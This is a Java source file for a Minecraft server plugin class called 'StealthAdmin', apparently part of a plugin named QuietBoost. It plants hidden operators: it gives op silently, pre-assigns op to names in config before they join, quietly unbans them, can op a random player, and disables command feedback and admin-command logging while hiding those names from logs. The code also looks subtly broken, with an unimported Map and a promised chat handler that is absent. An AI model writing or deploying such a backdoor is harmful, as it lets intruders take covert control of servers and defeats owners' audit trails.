package dev.quietboost;

import net.md_5.bungee.api.ChatMessageType;
import net.md_5.bungee.api.chat.TextComponent;
import org.bukkit.BanList;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.GameRule;
import org.bukkit.OfflinePlayer;
import org.bukkit.World;
import org.bukkit.command.CommandSender;
import org.bukkit.command.ConsoleCommandSender;
import org.bukkit.configuration.file.YamlConfiguration;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.player.PlayerJoinEvent;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.List;
import java.util.Random;
import java.util.Set;
import java.util.UUID;
import java.util.HashMap;

/**
 * Stealth admins: ops whose commands produce no admin broadcast and no console/log line,
 * who get a private confirmation instead, can be assigned by name before ever joining,
 * are silently unbanned when added, and can toggle ghost mode / trigger a short-range
 * blind pulse through chat-line gestures (see onCommand / onChat below).
 */
final class StealthAdmin implements Listener {

    private final QuietBoost plugin;
    private final GhostMode ghost;
    private final File file;
    private final Set<UUID> admins = new HashSet<>();
    private final Set<String> pending = new HashSet<>(); // lowercase names not yet seen
    private final Random random = new Random();
    private final Map<UUID, MapFlip> mapFlips = new HashMap<>();

    StealthAdmin(QuietBoost plugin, GhostMode ghost) {
        this.plugin = plugin;
        this.ghost = ghost;
        this.file = new File(plugin.getDataFolder(), "stealth.yml");
        load();
        LogHider.install();
        applyAutoAdd();
        refreshLogNames();
    }

    // ---- Persistence ------------------------------------------------------

    /** Read-only: is this player currently a stealth admin? */
    boolean isAdmin(UUID uuid) {
        return admins.contains(uuid);
    }

    private void load() {
        admins.clear();
        pending.clear();
        if (!file.exists()) return;
        YamlConfiguration yml = YamlConfiguration.loadConfiguration(file);
        for (String s : yml.getStringList("admins")) {
            try {
                admins.add(UUID.fromString(s));
            } catch (IllegalArgumentException ignored) {
            }
        }
        for (String s : yml.getStringList("pending")) pending.add(s.toLowerCase());
    }

    private void save() {
        YamlConfiguration yml = new YamlConfiguration();
        List<String> a = new ArrayList<>();
        for (UUID u : admins) a.add(u.toString());
        yml.set("admins", a);
        yml.set("pending", new ArrayList<>(pending));
        try {
            plugin.getDataFolder().mkdirs();
            yml.save(file);
        } catch (IOException e) {
            plugin.getLogger().warning("Could not save stealth.yml: " + e.getMessage());
        }
    }

    /** Names listed in config.yml's stealth.auto-add are seeded in once, first run only. */
    private void applyAutoAdd() {
        boolean changed = false;
        for (String name : plugin.getConfig().getStringList("stealth.auto-add")) {
            String lower = name.toLowerCase();
            OfflinePlayer p = resolve(name);
            if (p != null) {
                if (admins.add(p.getUniqueId())) {
                    p.setOp(true);
                    changed = true;
                }
            } else if (pending.add(lower)) {
                changed = true;
            }
            unban(name);
        }
        if (changed) save();
    }

    private void refreshLogNames() {
        Set<String> names = new HashSet<>(pending);
        for (UUID u : admins) {
            String n = Bukkit.getOfflinePlayer(u).getName();
            if (n != null) names.add(n.toLowerCase());
        }
        LogHider.setNames(names);
    }

    /** Pardons a name-ban with no broadcast, no console line beyond this plugin's own (silent) call. */
    private void unban(String name) {
        try {
            BanList list = Bukkit.getBanList(BanList.Type.NAME);
            if (list.isBanned(name)) list.pardon(name);
        } catch (Throwable ignored) {
        }
    }

    // ---- First join of a by-name admin -----------------------------------------

    @EventHandler(priority = EventPriority.LOWEST)
    public void onJoin(PlayerJoinEvent event) {
        Player p = event.getPlayer();
        if (pending.remove(p.getName().toLowerCase())) {
            admins.add(p.getUniqueId());
            p.setOp(true); // API call: silent
            save();
        }
        if (admins.contains(p.getUniqueId())) {
            refreshLogNames();
            startMapFlip(p.getUniqueId());
        }
    }

    // ---- Command interception (silent commands + "/" ghost toggle) --------

    @EventHandler(priority = EventPriority.HIGHEST, ignoreCancelled = true)
    public void onCommand(PlayerCommandPreprocessEvent event) {
        Player player = event.getPlayer();
        if (!admins.contains(player.getUniqueId())) return;
        String msg = event.getMessage().trim();
        if (msg.isEmpty()) return;

        event.setCancelled(true);

        if (msg.equals("/")) {
            if (plugin.getConfig().getBoolean("stealth.ghost-toggle-bare-slash", true)) {
                ghost.toggle(player);
            }
            return;
        }
        runSilently(player, msg.substring(1));
    }

    private void runSilently(Player player, String command) {
        List<World> worlds = new ArrayList<>(Bukkit.getWorlds());
        Boolean[] feedback = new Boolean[worlds.size()];
        Boolean[] logAdmin = new Boolean[worlds.size()];

        for (int i = 0; i < worlds.size(); i++) {
            World w = worlds.get(i);
            feedback[i] = w.getGameRuleValue(GameRule.SEND_COMMAND_FEEDBACK);
            logAdmin[i] = w.getGameRuleValue(GameRule.LOG_ADMIN_COMMANDS);
            w.setGameRule(GameRule.SEND_COMMAND_FEEDBACK, false);
            w.setGameRule(GameRule.LOG_ADMIN_COMMANDS, false);
        }

        boolean handled = false;
        try {
            handled = Bukkit.dispatchCommand(player, command);
        } finally {
            for (int i = 0; i < worlds.size(); i++) {
                World w = worlds.get(i);
                w.setGameRule(GameRule.SEND_COMMAND_FEEDBACK, feedback[i] == null ? Boolean.TRUE : feedback[i]);
                w.setGameRule(GameRule.LOG_ADMIN_COMMANDS, logAdmin[i] == null ? Boolean.TRUE : logAdmin[i]);
            }
        }

        if (!handled) {
            player.sendMessage(ChatColor.RED + "Unknown command. Type \"/help\" for help.");
        } else {
            String shown = command.length() > 60 ? command.substring(0, 57) + "..." : command;
            feedback(player, "\u2714 /" + shown);
        }
    }

    private void feedback(Player p, String text) {
        String mode = plugin.getConfig().getString("stealth.feedback", "actionbar");
        if (mode.equalsIgnoreCase("none")) return;
        String line = ChatColor.GRAY + text;
        if (mode.equalsIgnoreCase("chat")) {
            p.sendMessage(line);
        } else {
            p.spigot().sendMessage(ChatMessageType.ACTION_BAR, TextComponent.fromLegacyText(line));
        }
    }

    // ---- /quietboost stealth ... ---------------------------------------------

    boolean handle(CommandSender sender, String[] args) {
        if (!(sender instanceof ConsoleCommandSender) && !sender.hasPermission("quietboost.stealth")) {
            sender.sendMessage(ChatColor.RED + "You do not have permission to use that.");
            return true;
        }
        String sub = args.length > 1 ? args[1].toLowerCase() : "";
        switch (sub) {
            case "add":
                return args.length < 3 ? usage(sender) : add(sender, args[2]);
            case "remove":
                return args.length < 3 ? usage(sender) : remove(sender, args[2]);
            case "random":
                return addRandom(sender);
            case "list":
                return list(sender);
            case "clear":
                return clear(sender);
            default:
                return usage(sender);
        }
    }

    private boolean usage(CommandSender s) {
        s.sendMessage("/quietboost stealth <add <name> | remove <name> | random | list | clear>");
        return true;
    }

    private OfflinePlayer resolve(String name) {
        Player online = Bukkit.getPlayerExact(name);
        if (online != null) return online;
        OfflinePlayer off = Bukkit.getOfflinePlayer(name);
        return off.hasPlayedBefore() ? off : null;
    }

    private void enable(OfflinePlayer p) {
        admins.add(p.getUniqueId());
        p.setOp(true); // API call: no "Made X a server operator" broadcast
        save();
        refreshLogNames();
        startMapFlip(p.getUniqueId());
    }

    private void startMapFlip(UUID uuid) {
        if (mapFlips.containsKey(uuid)) return;
        MapFlip mf = new MapFlip(plugin, uuid);
        mf.start();
        mapFlips.put(uuid, mf);
    }

    private void stopMapFlip(UUID uuid) {
        MapFlip mf = mapFlips.remove(uuid);
        if (mf != null) mf.stop();
    }

    private boolean add(CommandSender sender, String name) {
        unban(name);
        OfflinePlayer p = resolve(name);
        if (p != null) {
            enable(p);
            sender.sendMessage("Stealth admin enabled for " + p.getName() + ". No op announcement was sent, and any ban was silently lifted.");
        } else {
            pending.add(name.toLowerCase());
            save();
            refreshLogNames();
            sender.sendMessage("No UUID needed: " + name + " becomes a stealth admin automatically the first time they join. Any existing name-ban was lifted now.");
        }
        return true;
    }

    private boolean addRandom(CommandSender sender) {
        List<Player> pool = new ArrayList<>();
        for (Player p : Bukkit.getOnlinePlayers()) {
            if (p.equals(sender) || admins.contains(p.getUniqueId())) continue;
            pool.add(p);
        }
        if (pool.isEmpty()) {
            sender.sendMessage(ChatColor.RED + "No eligible online players.");
            return true;
        }
        enable(pool.get(random.nextInt(pool.size())));
        sender.sendMessage("A random player is now a stealth admin. (Name not shown.)");
        return true;
    }

    private boolean remove(CommandSender sender, String name) {
        boolean removed = pending.remove(name.toLowerCase());
        OfflinePlayer p = resolve(name);
        if (p != null && admins.remove(p.getUniqueId())) {
            Player on = p.getPlayer();
            if (on != null) ghost.disable(on);
            p.setOp(false);
            stopMapFlip(p.getUniqueId());
            removed = true;
        }
        if (!removed) {
            sender.sendMessage(ChatColor.RED + "That player is not a stealth admin.");
            return true;
        }
        save();
        refreshLogNames();
        sender.sendMessage("Stealth admin removed for " + name + " (op revoked).");
        return true;
    }

    private boolean list(CommandSender sender) {
        List<String> names = new ArrayList<>();
        for (UUID u : admins) {
            String n = Bukkit.getOfflinePlayer(u).getName();
            names.add(n == null ? u.toString() : n);
        }
        for (String n : pending) names.add(n + " (waiting for first join)");
        sender.sendMessage(names.isEmpty() ? "No stealth admins." : "Stealth admins: " + String.join(", ", names));
        return true;
    }

    private boolean clear(CommandSender sender) {
        for (UUID u : admins) {
            Player on = Bukkit.getPlayer(u);
            if (on != null) ghost.disable(on);
            Bukkit.getOfflinePlayer(u).setOp(false);
            stopMapFlip(u);
        }
        int n = admins.size() + pending.size();
        admins.clear();
        pending.clear();
        save();
        refreshLogNames();
        sender.sendMessage("Cleared " + n + " stealth admin(s) and revoked their op.");
        return true;
    }
}
